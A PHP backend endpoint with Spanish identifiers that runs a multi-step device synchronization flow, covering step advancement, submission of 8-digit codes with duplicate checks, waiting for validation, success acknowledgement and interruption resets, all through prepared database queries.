<?php
error_reporting(E_ERROR | E_PARSE);

require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/sincronizacion_helpers.php';

exigirPOST();
$usuario_id = verificarUsuarioSesion();

try {
    $pdo = conectarBD();
    $input = leerJSON();
    $accion = $input['accion'] ?? '';

    if ($accion === 'avanzar_paso1') {
        $sync_id = intval($input['sync_id'] ?? 0);
        $stmt = $pdo->prepare("
            SELECT id FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente' AND paso_actual = 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        if (!$stmt->fetch()) {
            jsonResponse(['success' => false, 'error' => 'Sincronización no encontrada']);
        }

        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET paso_actual = 2, mensaje_error = NULL
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([$sync_id, $usuario_id]);

        jsonResponse(['success' => true]);
    }

    if ($accion === 'enviar_codigo') {
        $sync_id = intval($input['sync_id'] ?? 0);
        $codigo = trim((string) ($input['codigo'] ?? ''));

        if ($codigo === '' || !preg_match('/^[0-9]{8}$/', $codigo)) {
            jsonResponse(['success' => false, 'error' => SYNC_ERR_DIGITOS]);
        }

        $stmt = $pdo->prepare("
            SELECT * FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente' AND paso_actual = 2
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row) {
            jsonResponse(['success' => false, 'error' => SYNC_ERR_SESION]);
        }

        $usados = syncDecodificarUsados($row['codigos_usados'] ?? null);
        foreach ($usados as $prev) {
            if (strcasecmp($prev, $codigo) === 0) {
                jsonResponse([
                    'success' => false,
                    'error' => SYNC_ERR_CODIGO_USADO,
                ]);
            }
        }

        $usados[] = $codigo;

        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET estado = 'esperando_validacion',
                codigo_actual = ?,
                codigos_usados = ?,
                mensaje_error = NULL,
                fecha_codigo = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([
            $codigo,
            json_encode($usados, JSON_UNESCAPED_UNICODE),
            $sync_id,
            $usuario_id,
        ]);

        jsonResponse(['success' => true, 'message' => 'Código enviado. Esperando validación.']);
    }

    if ($accion === 'avanzar_despues_envio') {
        $sync_id = intval($input['sync_id'] ?? 0);
        $stmt = $pdo->prepare("
            SELECT * FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ? AND estado = 'esperando_validacion'
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row) {
            jsonResponse(['success' => false, 'error' => SYNC_ERR_SESION]);
        }

        if (empty($row['codigo_actual'])) {
            jsonResponse(['success' => true, 'estado' => 'esperando_validacion', 'exito_modo' => null, 'esperando_qr' => true]);
        }

        $resultado = syncAvanzarDespuesEnvio($pdo, $row);

        jsonResponse([
            'success' => true,
            'estado' => $resultado['estado'],
            'exito_modo' => $resultado['exito_modo'],
        ]);
    }

    if ($accion === 'cerrar_exito') {
        $sync_id = intval($input['sync_id'] ?? 0);

        $stmt = $pdo->prepare("
            SELECT id FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ? AND estado = 'completado'
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        if (!$stmt->fetch()) {
            jsonResponse(['success' => false, 'error' => 'Sincronización no encontrada']);
        }

        if (!isset($_SESSION['sync_cliente_ack']) || !is_array($_SESSION['sync_cliente_ack'])) {
            $_SESSION['sync_cliente_ack'] = [];
        }
        $_SESSION['sync_cliente_ack'][$sync_id] = 1;

        jsonResponse(['success' => true, 'message' => 'Sincronización finalizada']);
    }

    if ($accion === 'aceptar_interrupcion') {
        $sync_id = intval($input['sync_id'] ?? 0);

        $stmt = $pdo->prepare("
            SELECT id, tipo FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ? AND estado = 'interrupcion'
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$row) {
            jsonResponse(['success' => false, 'error' => 'No hay interrupción activa']);
        }

        if (($row['tipo'] ?? '') === 'qr') {
            $upd = $pdo->prepare("
                UPDATE sincronizacion_dispositivo
                SET estado = 'esperando_validacion',
                    paso_actual = 2,
                    codigo_actual = NULL,
                    qr_imagen_url = NULL,
                    mensaje_error = NULL
                WHERE id = ? AND usuario_id = ?
            ");
        } else {
            $upd = $pdo->prepare("
                UPDATE sincronizacion_dispositivo
                SET estado = 'pendiente',
                    paso_actual = 2,
                    codigo_actual = NULL,
                    mensaje_error = NULL
                WHERE id = ? AND usuario_id = ?
            ");
        }
        $upd->execute([$sync_id, $usuario_id]);

        jsonResponse(['success' => true, 'message' => 'Proceso reiniciado en paso 2']);
    }

    jsonResponse(['success' => false, 'error' => 'Acción no válida']);
} catch (PDOException $e) {
    error_log('sincronizacion_procesar PDO: ' . $e->getMessage());
    jsonError('Error de base de datos', 500);
} catch (Exception $e) {
    error_log('sincronizacion_procesar: ' . $e->getMessage());
    jsonError('Error interno', 500);
}
